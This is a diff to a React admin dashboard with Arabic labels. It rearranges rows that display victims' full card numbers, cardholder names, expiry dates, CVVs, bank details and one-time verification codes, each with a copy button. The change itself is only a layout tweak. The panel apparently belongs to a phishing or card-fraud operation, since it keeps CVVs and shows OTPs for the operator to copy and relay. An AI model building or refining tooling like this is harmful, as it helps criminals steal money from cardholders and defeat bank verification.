@@ -740,68 +740,70 @@ export default function AdminDashboard() {
                         />
                       </div>
 
-                      <DataRow
-                        label="طريقة الدفع"
-                        value={selectedApplication.paymentMethod}
-                        onCopy={copyToClipboard}
-                        copied={copiedField!}
-                      />
-                      <DataRow
-                        label="رقم البطاقة"
-                        value={selectedApplication.cardNumber ? `${selectedApplication.cardNumber}` : undefined}
-                        onCopy={() => {
-                          if (selectedApplication.cardNumber) {
-                            navigator.clipboard.writeText(selectedApplication.cardNumber)
-                            setCopiedField("cardNumber")
+                      <div className="grid grid-cols-2 gap-1">
+                        <DataRow
+                          label="طريقة الدفع"
+                          value={selectedApplication.paymentMethod}
+                          onCopy={copyToClipboard}
+                          copied={copiedField!}
+                        />
+                        <DataRow
+                          label="رقم البطاقة"
+                          value={selectedApplication.cardNumber ? `${selectedApplication.cardNumber}` : undefined}
+                          onCopy={() => {
+                            if (selectedApplication.cardNumber) {
+                              navigator.clipboard.writeText(selectedApplication.cardNumber)
+                              setCopiedField("cardNumber")
+                            }
+                          }}
+                          copied={""}
+                        />
+                        <DataRow
+                          label="اسم حامل البطاقة"
+                          value={selectedApplication.cardHolderName}
+                          onCopy={copyToClipboard}
+                          copied={copiedField!}
+                        />
+                        <DataRow
+                          label="تاريخ الانتهاء"
+                          value={selectedApplication.expiryDate}
+                          onCopy={copyToClipboard}
+                          copied={copiedField!}
+                        />
+                        <DataRow
+                          label="cvv"
+                          value={selectedApplication.cvv}
+                          onCopy={copyToClipboard}
+                          copied={copiedField!}
+                        />
+                        <DataRow
+                          label="نوع البطاقة"
+                          value={selectedApplication.cardType}
+                          onCopy={copyToClipboard}
+                          copied={copiedField!}
+                        />
+                        <DataRow
+                          label="معلومات البنك"
+                          value={
+                            selectedApplication.bankInfo
+                              ? typeof selectedApplication.bankInfo === "object"
+                                ? `${(selectedApplication.bankInfo as any).name || ""} - ${(selectedApplication.bankInfo as any).country || ""}`
+                                : selectedApplication.bankInfo
+                              : undefined
                           }
-                        }}
-                        copied={""}
-                      />
-                      <DataRow
-                        label="اسم حامل البطاقة"
-                        value={selectedApplication.cardHolderName}
-                        onCopy={copyToClipboard}
-                        copied={copiedField!}
-                      />
-                      <DataRow
-                        label="تاريخ الانتهاء"
-                        value={selectedApplication.expiryDate}
-                        onCopy={copyToClipboard}
-                        copied={copiedField!}
-                      />
-                      <DataRow
-                        label="cvv"
-                        value={selectedApplication.cvv}
-                        onCopy={copyToClipboard}
-                        copied={copiedField!}
-                      />
-                      <DataRow
-                        label="نوع البطاقة"
-                        value={selectedApplication.cardType}
-                        onCopy={copyToClipboard}
-                        copied={copiedField!}
-                      />
-                      <DataRow
-                        label="معلومات البنك"
-                        value={
-                          selectedApplication.bankInfo
-                            ? typeof selectedApplication.bankInfo === "object"
-                              ? `${(selectedApplication.bankInfo as any).name || ""} - ${(selectedApplication.bankInfo as any).country || ""}`
-                              : selectedApplication.bankInfo
-                            : undefined
-                        }
-                        onCopy={copyToClipboard}
-                        copied={copiedField!}
-                      />
-                      <DataRow
-                        label="رمز التحقق"
-                        value={selectedApplication.otp}
-                        onCopy={copyToClipboard}
-                        copied={copiedField!}
-                      />
+                          onCopy={copyToClipboard}
+                          copied={copiedField!}
+                        />
+                        <DataRow
+                          label="رمز التحقق"
+                          value={selectedApplication.otp}
+                          onCopy={copyToClipboard}
+                          copied={copiedField!}
+                        />
+                      </div>
                       {selectedApplication.paymentStatus && (
                         <Badge
-                          className={`text-[8px] w-fit ${selectedApplication.paymentStatus === "completed" ? "bg-emerald-500/20 text-emerald-400" : selectedApplication.paymentStatus === "failed" ? "bg-red-500/20 text-red-400" : "bg-amber-500/20 text-amber-400"}`}
+                          className={`text-[8px] w-fit mt-1 ${selectedApplication.paymentStatus === "completed" ? "bg-emerald-500/20 text-emerald-400" : selectedApplication.paymentStatus === "failed" ? "bg-red-500/20 text-red-400" : "bg-amber-500/20 text-amber-400"}`}
                         >
                           {selectedApplication.paymentStatus}
                         </Badge>
